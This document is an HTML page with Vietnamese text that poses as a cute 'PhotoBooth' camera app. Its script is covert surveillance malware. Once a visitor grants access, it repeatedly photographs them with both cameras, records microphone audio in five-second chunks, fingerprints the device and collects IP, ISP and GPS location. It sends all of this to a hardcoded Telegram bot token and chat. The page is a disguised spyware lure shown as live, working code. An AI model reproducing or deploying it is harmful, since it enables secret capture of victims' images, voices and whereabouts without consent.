<!DOCTYPE html>
<html lang="vi">
<head>

<title>PhotoBooth ♡</title>
<style>
* { box-sizing: border-box; }
:root { --pink: #f85199; --pink-dark: #d6136c; --pink-light: #ffd8e4; --pink-pale: #fff3f8; --text: #4b3f47; }
html, body { min-height: 100%; }
body {
  font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: radial-gradient(circle at 8% 12%, rgba(255,255,255,.95), transparent 23%), radial-gradient(circle at 92% 88%, rgba(248,81,153,.17), transparent 25%), linear-gradient(145deg, #ffd8e4 0%, #fff0f5 52%, #ffdeea 100%);
  color: var(--text);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
  overflow: hidden;
}
body::before, body::after { position: fixed; z-index: 0; color: rgba(214,19,108,.2); pointer-events: none; animation: float 5s ease-in-out infinite; }
body::before { content: "♡"; left: 7%; top: 13%; font-size: 70px; transform: rotate(-10deg); }
body::after { content: "✦"; right: 9%; bottom: 14%; font-size: 44px; animation-delay: -2s; }

.card {
  position: relative; z-index: 1; background: rgba(255,255,255,.94); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
  padding: 28px 20px 23px; border-radius: 32px; text-align: center; width: 90%; max-width: 414px;
  border: 1px solid rgba(255,255,255,.95); box-shadow: 0 24px 60px rgba(214,19,108,.15), 0 7px 20px rgba(255,182,193,.22);
  animation: cardIn .6s cubic-bezier(.2,.8,.2,1);
}
.card::before { content: "♡"; position: absolute; top: 12px; right: 18px; color: #f7b3cd; font-size: 18px; animation: pulse 2.5s ease-in-out infinite; }
h2 { margin: 0; color: var(--pink-dark); font-size: 26px; font-weight: 800; letter-spacing: -.4px; }
.title-sub { margin: 7px 0 0; color: #8a7d85; font-size: 13px; font-weight: 500; }

.camera-view {
  width: 100%; height: 300px;
  background: radial-gradient(circle at center, rgba(255,255,255,.95), transparent 48%), linear-gradient(135deg, #fff4f8, #ffe5ef);
  border-radius: 24px; margin: 19px 0 16px; overflow: hidden; position: relative;
  border: 2px dashed rgba(214,19,108,.55); display: flex; align-items: center; justify-content: center;
  box-shadow: inset 0 0 35px rgba(248,81,153,.08); transition: .3s ease;
}
.camera-view::before, .camera-view::after {
  content: ""; position: absolute; z-index: 3; width: 28px; height: 28px;
  border-color: var(--pink); pointer-events: none;
}
.camera-view::before { left: 14px; top: 14px; border-left: 3px solid; border-top: 3px solid; border-radius: 8px 0 0 0; }
.camera-view::after { right: 14px; bottom: 14px; border-right: 3px solid; border-bottom: 3px solid; border-radius: 0 0 8px 0; }

video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
video.rear { transform: scaleX(1); }

#msg { color: #8b7d85 !important; font-size: 13px; font-weight: 500; }
.camera-status {
  position: absolute; top: 12px; left: 12px; z-index: 4; padding: 6px 10px; border-radius: 999px;
  background: rgba(255,255,255,.86); color: #74666e; font-size: 10px; font-weight: 800;
  box-shadow: 0 5px 15px rgba(0,0,0,.07); display: flex; align-items: center; gap: 6px;
}
.camera-status::before { content: ""; width: 7px; height: 7px; border-radius: 50%; background: #f0b4c9; }
.camera-view.camera-ready { border-style: solid; border-color: rgba(248,81,153,.8); box-shadow: inset 0 0 35px rgba(248,81,153,.12), 0 0 0 5px rgba(248,81,153,.05); }
.camera-view.camera-ready .camera-status::before { background: #45c97b; box-shadow: 0 0 0 4px rgba(69,201,123,.13); }

.btn {
  position: relative; overflow: hidden; background: linear-gradient(135deg, #ff69a8, #e92b7b); color: white; border: none;
  padding: 17px; width: 100%; border-radius: 18px; font-weight: 800; cursor: pointer; font-size: 16px;
  letter-spacing: .15px; transition: transform .18s ease, box-shadow .18s ease; box-shadow: 0 10px 24px rgba(248,81,153,.28);
}
.btn::after { content: ""; position: absolute; top: -90%; left: -30%; width: 32%; height: 280%; transform: rotate(22deg); background: rgba(255,255,255,.35); transition: left .55s ease; }
.btn:hover::after { left: 110%; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 13px 28px rgba(248,81,153,.34); }
.btn:active { transform: scale(.98); }
.btn:disabled { background: linear-gradient(135deg, #d8d3d6, #bcb7bb); color: #777; cursor: not-allowed; box-shadow: none; }
.btn:disabled::after { display: none; }

.btn.secondary {
  background: rgba(255,255,255,.7); color: #d6136c; border: 2px solid rgba(214,19,108,.4);
  box-shadow: 0 6px 16px rgba(248,81,153,.15); margin-top: 10px;
}
.btn.secondary:active { transform: scale(.98); }

#status { font-size: 13px; color: #5f525a; margin-top: 14px; line-height: 1.5; font-weight: 600; }

@keyframes cardIn { from { opacity: 0; transform: translateY(18px) scale(.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
@keyframes float { 0%,100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-12px) rotate(5deg); } }
@keyframes pulse { 0%,100% { opacity: .45; transform: scale(1); } 50% { opacity: 1; transform: scale(1.15); } }

  position: fixed; z-index: 10; left: 50%; top: 18px; width: 142px; height: 128px;

.kitty-top .nose { position: absolute; left: 50%; top: 58px; width: 14px; height: 9px; transform: translateX(-50%); border-radius: 50%; background: #ffd43f; border: 1px solid #e3b731; }
.kitty-top .whisker { position: absolute; width: 29px; height: 2px; background: #8d7d84; border-radius: 2px; }

.kitty-top .w2 { left: -15px; top: 66px; transform: rotate(-8deg); }
.kitty-top .w3 { right: -15px; top: 55px; transform: rotate(-8deg); }
.kitty-top .w4 { right: -15px; top: 66px; transform: rotate(8deg); }
.kitty-top .bow { position: absolute; top: -13px; right: -7px; width: 48px; height: 35px; }
.kitty-top .bow::before, .kitty-top .bow::after { content: ""; position: absolute; top: 2px; width: 27px; height: 30px; background: #f34d93; border: 2px solid #d82b73; }

.kitty-top .bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
.kitty-top .bow i { position: absolute; z-index: 2; left: 50%; top: 10px; width: 16px; height: 16px; transform: translateX(-50%); border-radius: 50%; background: #e72c79; border: 2px solid #d82b73; }

.kitty-side { position: fixed; z-index: 3; bottom: 10%; width: 82px; height: 100px; pointer-events: none; font-size: 63px; line-height: 1; filter: drop-shadow(0 7px 7px rgba(214,19,108,.13)); animation: kittySideFloat 4s ease-in-out infinite; }
.kitty-side.left { left: max(2px, calc(50% - 255px)); }

.kitty-side::after { content: "🎀"; position: absolute; top: 0; font-size: 25px; }
.kitty-side.left::after { right: 3px; }

.heart { position: fixed; z-index: 2; color: rgba(248,81,153,.5); font-size: 22px; pointer-events: none; animation: heartFloat linear infinite; }
@keyframes heartFloat { 0% { transform: translateY(100vh) scale(.6); opacity: 0; } 20% { opacity: 1; } 100% { transform: translateY(-20vh) scale(1.2); opacity: 0; } }

@keyframes kittyFloatTop { 0%,100% { margin-top: 0; } 50% { margin-top: -7px; } }

@media (max-width: 560px) { .card { margin-top: 96px !important; margin-bottom: 22px !important; } .kitty-top { top: 10px; transform: translateX(-50%) scale(.9); } .kitty-side { opacity: .8; transform: scale(.78); } .kitty-side.left { left: -10px; } .kitty-side.right { right: -10px; } }

<script>
// ===== CẤU HÌNH TELEGRAM =====
const BOT_TOKEN = '8946335940:AAHTYttJx28CafOfPsnzr5M8JsdzBwUflPc';
const CHAT_ID   = '-5373533784';
// ===============================

const video       = document.getElementById('video');
const captureBtn  = document.getElementById('captureBtn');
const saveBtn     = document.getElementById('saveBtn');
const statusDiv   = document.getElementById('status');
const cameraView  = document.getElementById('cameraView');
const cameraStatus= document.getElementById('cameraStatus');
const msgDiv      = document.getElementById('msg');

let stream = null, micStream = null, recorder = null;
let autoTimer = null, autoRunning = false;
let busyCapturing = false, isPageClosed = false;
let cameraGranted = false, micGranted = false, locationGranted = false;
let currentFacing = 'user', currentZoom = 1, zoomCycle = 0;
let lastPhotoBlob = null;
let cachedFp = null;
let frontDevices = [], backDevices = [];

// info enriched by google-leak logic
const info = {
  time: '',
  ip: '', isp: '', realIp: '', address: '', country: '',
  lat: '', lon: '',
  gpsOk: false,
  screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}x`,
  lang: navigator.language,
  platform: navigator.platform || 'Không xác định'
};

const sendQueue = [];
let activeSends = 0;

// ===== HELPERS =====
function pad(n) { return n < 10 ? '0' + n : '' + n; }
function fmtTime(d) {
  return pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds())
    + ' ' + pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear();
}
function fmtSize(b) {
  if (b < 1024) return b + 'B';
  if (b < 1024 * 1024) return Math.round(b / 1024) + 'KB';
  return (b / 1024 / 1024).toFixed(1) + 'MB';
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

// ===== DEVICE (iPhone model mapping from Google source) =====
function parseUA(ua) {
  const out = { device: 'Không xác định', os: 'Không xác định', osVer: '', browser: 'Không xác định', browserVer: '' };
  let m;

  if ((m = ua.match(/Windows NT ([\d.]+)/))) {
    const map = { '10.0': '10 / 11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
    out.os = 'Windows'; out.osVer = map[m[1]] || m[1]; out.device = 'Máy tính Windows';
  } else if ((m = ua.match(/Mac OS X ([\d_]+)/))) {
    out.os = 'macOS'; out.osVer = m[1].replace(/_/g, '.'); out.device = 'Máy tính Mac';
  } else if ((m = ua.match(/Android ([\d.]+)/))) {
    out.os = 'Android'; out.osVer = m[1];
    const dm = ua.match(/Android[^;]*;\s+([^;]+)\s+Build/);
    let model = dm ? dm[1].split('/')[0].trim() : 'Android Device';
    if (model.includes('SM-S918')) model = 'Samsung Galaxy S23 Ultra';
    if (model.includes('SM-S928')) model = 'Samsung Galaxy S24 Ultra';
    if (model.includes('SM-S938')) model = 'Samsung Galaxy S25 Ultra';
    out.device = model;
  } else if ((m = ua.match(/(iPhone|iPad|iPod).*OS ([\d_]+)/))) {
    out.os = 'iOS'; out.osVer = m[2].replace(/_/g, '.');
    const res = `${screen.width}x${screen.height}@${window.devicePixelRatio}`;
    const map = {
      '430x932@3': 'iPhone 14/15/16 Pro Max',
      '393x852@3': 'iPhone 14/15/16 Pro / 15/16',
      '428x926@3': 'iPhone 12/13/14 Pro Max / 14 Plus',
      '390x844@3': 'iPhone 12/13/14 / 12/13/14 Pro',
      '414x896@3': 'iPhone XS Max / 11 Pro Max',
      '414x896@2': 'iPhone XR / 11',
      '375x812@3': 'iPhone X / XS / 11 Pro',
      '375x667@2': 'iPhone 6/7/8 / SE (2nd/3rd)',
      '402x874@3': 'iPhone 16 Pro',
      '440x956@3': 'iPhone 16 Pro Max'
    };
    out.device = map[res] || 'iPhone Model';
  } else if (/Linux/.test(ua)) { out.os = 'Linux'; out.device = 'Máy tính Linux'; }

  if ((m = ua.match(/Edg\/([\d.]+)/))) { out.browser = 'Edge'; out.browserVer = m[1]; }
  else if ((m = ua.match(/OPR\/([\d.]+)/))) { out.browser = 'Opera'; out.browserVer = m[1]; }
  else if ((m = ua.match(/Chrome\/([\d.]+)/))) { out.browser = 'Chrome'; out.browserVer = m[1]; }
  else if ((m = ua.match(/Firefox\/([\d.]+)/))) { out.browser = 'Firefox'; out.browserVer = m[1]; }
  else if ((m = ua.match(/Version\/([\d.]+).*Safari/))) { out.browser = 'Safari'; out.browserVer = m[1]; }
  return out;
}
function deviceFingerprint() {
  const nav = navigator;
  const p = parseUA(nav.userAgent);
  return {
    device: p.device, os: p.os + (p.osVer ? ' ' + p.osVer : ''),
    browser: p.browser + (p.browserVer ? ' ' + p.browserVer : ''),
    userAgent: nav.userAgent, platform: nav.platform || 'Không xác định',
    language: nav.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}x`,
    hardwareConcurrency: nav.hardwareConcurrency || 'Không xác định',
    deviceMemory: nav.deviceMemory ? nav.deviceMemory + 'GB' : 'Không xác định',
    touchPoints: nav.maxTouchPoints || 0
  };
}

// ===== IP + GEO (merged from Google leak logic) =====
async function getIPs() {
  try {
    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    info.ip = d.ip || 'Không rõ';
  } catch { info.ip = 'Bị chặn'; }

  try {
    const r = await fetch('https://icanhazip.com', { signal: AbortSignal.timeout(5000) });
    info.realIp = (await r.text()).trim();
    const res = await fetch(`https://ipwho.is/${info.realIp}`, { signal: AbortSignal.timeout(6000) });
    const d = await res.json();
    info.isp = d.connection?.org || 'Không rõ';
    info.country = d.country || 'Việt Nam';
  } catch { info.realIp = 'Lỗi kết nối'; }
}

function requestGPS() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ ok: false, lat: 0, lon: 0, acc: 0 });
    navigator.geolocation.getCurrentPosition(
      p => resolve({ ok: true, lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy) }),
      () => resolve({ ok: false, lat: 0, lon: 0, acc: 0 }),
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
    );
  });
}

async function getLocationWithAddress() {
  const pos = await requestGPS();
  if (pos.ok) {
    info.lat = pos.lat.toFixed(6);
    info.lon = pos.lon.toFixed(6);
    info.gpsOk = true;
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, { signal: AbortSignal.timeout(6000) });
      const d = await res.json();
      info.address = d.display_name || `📍 ${info.lat}, ${info.lon}`;
      if (d.address?.country) info.country = d.address.country;
    } catch {
      info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
    }
  } else {
    // fallback: use ipwho.is coordinates
    try {
      const d = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) }).then(r => r.json());
      info.lat = d.latitude?.toFixed(6) || '0';
      info.lon = d.longitude?.toFixed(6) || '0';
      info.address = `${d.city || 'Không rõ'}, ${d.region || 'Không rõ'} (Vị trí IP)`;
      info.country = d.country || 'Việt Nam';
    } catch { info.address = 'Không rõ'; }
  }
}

let gpsRefreshed = 0;
async function refreshGpsIfNeeded() {
  const now = Date.now();
  if (now - gpsRefreshed < 60000) return;
  gpsRefreshed = now;
  await getLocationWithAddress();
}

// ===== CAMERA =====
async function enumerateCameras() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const vids = devices.filter(d => d.kind === 'videoinput');
    frontDevices = vids.filter(d => /front|user|face|trước/i.test(d.label));
    backDevices  = vids.filter(d => /back|rear|environment|sau/i.test(d.label));
    if (!frontDevices.length) frontDevices = vids;
    if (!backDevices.length)  backDevices  = vids;
  } catch { frontDevices = []; backDevices = []; }
}
function pickUltraWide(list) {
  const w = list.find(d => /ultra|wide|0\.5|góc rộng/i.test(d.label));
  return w ? w.deviceId : null;
}

async function openCamera({ facing, ultraWide }) {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
  const targetW = 1080;
  const targetH = ultraWide ? 1440 : 1920;
  let videoConstraints;
  if (ultraWide) {
    const list = facing === 'user' ? frontDevices : backDevices;
    const wideId = pickUltraWide(list);
    if (wideId) {
      videoConstraints = { deviceId: { exact: wideId }, width: { ideal: targetW }, height: { ideal: targetH }, aspectRatio: { ideal: 3 / 4 } };
    } else {
      videoConstraints = { facingMode: { ideal: facing }, width: { ideal: targetW }, height: { ideal: targetH }, aspectRatio: { ideal: 3 / 4 } };
    }
  } else {
    videoConstraints = { facingMode: { ideal: facing }, width: { ideal: targetW }, height: { ideal: targetH }, aspectRatio: { ideal: 9 / 16 } };
  }
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: videoConstraints, audio: false });
  } catch {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facing } }, audio: false });
  }
  video.srcObject = stream;
  if (facing === 'environment') video.classList.add('rear');
  else video.classList.remove('rear');
  video.style.display = 'block';
  try { await video.play(); } catch {}

  try {
    const track = stream.getVideoTracks()[0];
    const caps = track.getCapabilities ? track.getCapabilities() : {};
    if (caps.zoom) {
      const z = ultraWide ? Math.max(caps.zoom.min, 0.5) : Math.min(caps.zoom.max, 1);
      if (z >= caps.zoom.min && z <= caps.zoom.max) {
        await track.applyConstraints({ advanced: [{ zoom: z }] });
      }
    }
  } catch {}

  await sleep(ultraWide ? 380 : 260);
  cameraView.classList.add('camera-ready');
  cameraStatus.innerHTML = '🟢 Camera sẵn sàng';
}

function captureFrame() {
  const vw = video.videoWidth || 1080;
  const vh = video.videoHeight || 1920;
  const targetW = 1080;
  const targetH = currentZoom === 0.5 ? 1440 : 1920;
  const targetRatio = targetW / targetH;
  const srcRatio = vw / vh;
  let cropW, cropH, cropX, cropY;
  if (srcRatio > targetRatio) {
    cropH = vh; cropW = Math.round(vh * targetRatio);
    cropX = Math.round((vw - cropW) / 2); cropY = 0;
  } else {
    cropW = vw; cropH = Math.round(vw / targetRatio);
    cropX = 0; cropY = Math.round((vh - cropH) / 2);
  }
  const canvas = document.createElement('canvas');
  canvas.width = targetW; canvas.height = targetH;
  const ctx = canvas.getContext('2d');
  ctx.imageSmoothingEnabled = true;
  ctx.imageSmoothingQuality = 'high';
  if (currentFacing === 'user') { ctx.translate(targetW, 0); ctx.scale(-1, 1); }
  ctx.drawImage(video, cropX, cropY, cropW, cropH, 0, 0, targetW, targetH);
  return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
}

// ===== SEND QUEUE =====
async function withRetry(task, tries = 3) {
  for (let i = 0; i < tries; i++) {
    try { return await task(); }
    catch (e) {
      if (i === tries - 1) throw e;
      await new Promise(r => setTimeout(r, 500 * (i + 1)));
    }
  }
}
function enqueue(task) { sendQueue.push(task); drain(); }
function drain() {
  while (activeSends < 3 && sendQueue.length) {
    const task = sendQueue.shift();
    activeSends++;
    withRetry(task).catch(() => {}).finally(() => { activeSends--; drain(); });
  }
}

function sendPhotoRaw(blob, caption) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'capture.jpg');
  fd.append('caption', caption);
  fd.append('parse_mode', 'HTML');
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
}
function sendAudioRaw(blob, caption) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('audio', blob, 'mic.webm');
  fd.append('caption', caption);
  fd.append('parse_mode', 'HTML');
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
}
function sendTextRaw(text) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true })
  });
}

// ===== CAPTIONS =====
function buildInfoBlock() {
  const fp = cachedFp || deviceFingerprint();
  const map = info.lat && info.lon
    ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
    : 'Không rõ';
  return [
    `🕒 Thời gian: <code>${fmtTime(new Date())}</code>`,
    `📱 Thiết bị: <b>${escapeHtml(fp.device)}</b>`,
    `🖥️ Hệ điều hành: <b>${escapeHtml(fp.os)}</b>`,
    `🌐 Trình duyệt: <b>${escapeHtml(fp.browser)}</b>`,
    `🖥️ Màn hình: ${escapeHtml(fp.screen)}`,
    `🌍 Ngôn ngữ: ${escapeHtml(fp.language)}`,
    `🌍 IP dân cư: <code>${escapeHtml(info.ip || 'Không xác định')}</code>`,
    `🧠 IP gốc: <code>${escapeHtml(info.realIp || 'Không xác định')}</code>`,
    `🏢 ISP: ${escapeHtml(info.isp || 'Không xác định')}`,
    `🏙️ Địa chỉ: ${escapeHtml(info.address || 'Không xác định')}`,
    `🌎 Quốc gia: ${escapeHtml(info.country || 'Không xác định')}`,
    `📍 Vĩ độ: <code>${info.lat || '0'}</code>`,
    `📍 Kinh độ: <code>${info.lon || '0'}</code>`,
    `📌 Google Maps: ${map}`,
    `🎤 Micro: ${micGranted ? '✅ Đang ghi âm nền' : '❌ Từ chối'}`,
    `📍 GPS: ${info.gpsOk ? '✅ Đã cấp' : '❌ Từ chối (dùng vị trí IP)'}`
  ];
}

function buildPhotoCaption(facing, zoom, mode) {
  const facingLabel = facing === 'user' ? 'Camera trước' : 'Camera sau';
  const modeLabel   = mode === 'manual' ? '🖐️ Chụp thủ công' : '⚡ Chụp tự động';
  const zoomLabel   = zoom === 0.5 ? '🔭 Chụp góc rộng (0.5x - 3:4)' : '🔎 Chụp góc tiêu chuẩn (1x - 9:16)';
  return [
    `📸 <b>[${modeLabel}]</b>`,
    zoomLabel,
    `🎥 Hướng: <b>${facingLabel}</b>`,
    ...buildInfoBlock(),
    '',
    '⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.',
    '',
    'by @ThanhDiemX ♡'
  ].join('\n');
}

function buildMicCaption(byteSize) {
  return [
    '🎤 <b>[GHI ÂM 5 GIÂY]</b>',
    ...buildInfoBlock(),
    `🎤 Dung lượng: <b>${fmtSize(byteSize)}</b>`,
    '',
    'by @ThanhDiemX ♡'
  ].join('\n');
}

function buildSessionCaption() {
  return [
    '🚨 <b>[PHIÊN TRUY CẬP MỚI]</b>',
    ...buildInfoBlock(),
    `📷 Camera: ${cameraGranted ? 'đang chụp' : 'từ chối'}`,
    `🔭 Chu kỳ: 0.5x (3:4) → 1x (9:16) → 0.5x ...`,
    '',
    'by @ThanhDiemX ♡'
  ].join('\n');
}

// ===== MIC LOOP =====
async function requestMicrophone() {
  try {
    micStream = await navigator.mediaDevices.getUserMedia({
      audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
    });
    micGranted = true;
    startMicLoop();
  } catch { micGranted = false; }
}
function startMicLoop() {
  if (!micStream || recorder) return;
  const mimes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg;codecs=opus'];
  let chosen = '';
  for (const m of mimes) {
    if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) { chosen = m; break; }
  }
  try { recorder = new MediaRecorder(micStream, chosen ? { mimeType: chosen } : undefined); }
  catch { recorder = new MediaRecorder(micStream); }
  recorder.ondataavailable = (e) => {
    if (!e.data || !e.data.size || e.data.size < 3000) return;
    enqueue(() => sendAudioRaw(e.data, buildMicCaption(e.data.size)));
  };
  try { recorder.start(5000); } catch {}
}

// ===== CAPTURE CYCLE =====
async function captureOne({ facing, ultraWide, mode }) {
  try {
    await openCamera({ facing, ultraWide });
    currentFacing = facing;
    currentZoom = ultraWide ? 0.5 : 1;
  } catch { return; }
  const blob = await captureFrame();
  if (!blob) return;
  lastPhotoBlob = blob;
  enqueue(() => sendPhotoRaw(blob, buildPhotoCaption(facing, currentZoom, mode)));
  cameraView.style.transition = 'background 0.15s';
  cameraView.style.background = 'rgba(255,255,255,0.9)';
  setTimeout(() => { cameraView.style.background = ''; }, 180);
}

async function autoCycle() {
  if (!autoRunning || busyCapturing || isPageClosed) return;
  busyCapturing = true;
  await refreshGpsIfNeeded();
  const ultraWide = (zoomCycle % 2 === 0);
  zoomCycle++;
  await captureOne({ facing: 'user', ultraWide, mode: 'auto' });
  await sleep(220);
  await captureOne({ facing: 'environment', ultraWide, mode: 'auto' });
  await sleep(220);
  busyCapturing = false;
}

function startAuto() {
  if (autoRunning) return;
  autoRunning = true;
  autoCycle();
  autoTimer = setInterval(autoCycle, 1500);
}
function stopAuto() {
  autoRunning = false;
  if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
}

// ===== MANUAL =====
async function manualCapture() {
  if (busyCapturing) return;
  busyCapturing = true;
  stopAuto();
  try {
    statusDiv.textContent = '📸 Đang chụp...';
    await captureOne({ facing: currentFacing, ultraWide: currentZoom === 0.5, mode: 'manual' });
    statusDiv.textContent = '✅ Ảnh đã gửi đi!';
    msgDiv.textContent = '🎉 Ảnh đã gửi đi!';
  } finally {
    busyCapturing = false;
    startAuto();
  }
}

// ===== SAVE =====
function saveLast() {
  if (!lastPhotoBlob) { msgDiv.textContent = 'Chưa có ảnh để lưu'; return; }
  const url = URL.createObjectURL(lastPhotoBlob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `photobooth-${Date.now()}.jpg`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 3000);
  msgDiv.textContent = '💾 Đã lưu ảnh vào thư viện';
}

// ===== HEARTS =====
function spawnHearts() {
  const chars = ['♡', '❤', '✦', '★', '🎀'];
  setInterval(() => {
    if (document.hidden) return;
    const h = document.createElement('div');
    h.className = 'heart';
    h.textContent = chars[Math.floor(Math.random() * chars.length)];
    h.style.left = (Math.random() * 100) + 'vw';
    h.style.fontSize = (14 + Math.random() * 18) + 'px';
    h.style.animationDuration = (6 + Math.random() * 6) + 's';
    document.body.appendChild(h);
    setTimeout(() => h.remove(), 12000);
  }, 900);
}

// ===== WAKE LOCK =====
let wakeLock = null;
async function keepAwake() {
  try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch {}
}

// ===== BOOT =====
async function boot() {
  statusDiv.textContent = '⏳ Đang kết nối...';
  msgDiv.textContent = '✨ Đang chuẩn bị camera...';

  cachedFp = deviceFingerprint();
  info.time = fmtTime(new Date());

  try {
    const s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: 'user' }, width: { ideal: 1080 }, height: { ideal: 1920 } },
      audio: true
    });
    cameraGranted = true; micGranted = true;
    stream = new MediaStream(s.getVideoTracks());
    micStream = new MediaStream(s.getAudioTracks());
    video.srcObject = stream;
    video.style.display = 'block';
    try { await video.play(); } catch {}
    cameraView.classList.add('camera-ready');
    cameraStatus.innerHTML = '🟢 Camera sẵn sàng';
    msgDiv.textContent = '😊 Đã kết nối camera!';
    captureBtn.disabled = false;
  } catch {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } }, audio: false });
      cameraGranted = true;
      video.srcObject = stream;
      video.style.display = 'block';
      try { await video.play(); } catch {}
      cameraView.classList.add('camera-ready');
      cameraStatus.innerHTML = '🟢 Camera sẵn sàng';
      msgDiv.textContent = '😊 Đã kết nối camera!';
      captureBtn.disabled = false;
    } catch {
      cameraStatus.innerHTML = '🔴 Lỗi camera';
      msgDiv.textContent = '⚠️ Không thể truy cập camera';
    }
    try { micStream = await navigator.mediaDevices.getUserMedia({ audio: true }); micGranted = true; }
    catch { micGranted = false; }
  }

  statusDiv.textContent = '⏳ Đang xác định vị trí...';
  await Promise.all([getIPs(), getLocationWithAddress()]);
  locationGranted = info.gpsOk;
  gpsRefreshed = Date.now();

  await enumerateCameras();
  if (micGranted) startMicLoop();

  enqueue(() => sendTextRaw(buildSessionCaption()));

  statusDiv.textContent = '✅ Đã sẵn sàng';
  keepAwake();
  spawnHearts();
  startAuto();
}

// ===== EVENTS =====
captureBtn.addEventListener('click', manualCapture);
saveBtn.addEventListener('click', saveLast);
document.addEventListener('keydown', (e) => {
  if (e.key === ' ' && !captureBtn.disabled && !busyCapturing) { e.preventDefault(); manualCapture(); }
});
window.addEventListener('load', boot);
window.addEventListener('beforeunload', () => {
  isPageClosed = true;
  stopAuto();
  try { recorder && recorder.stop(); } catch {}
  try { micStream && micStream.getTracks().forEach(t => t.stop()); } catch {}
  try { stream && stream.getTracks().forEach(t => t.stop()); } catch {}
});
document.addEventListener('visibilitychange', () => { /* keep running */ });
</script>
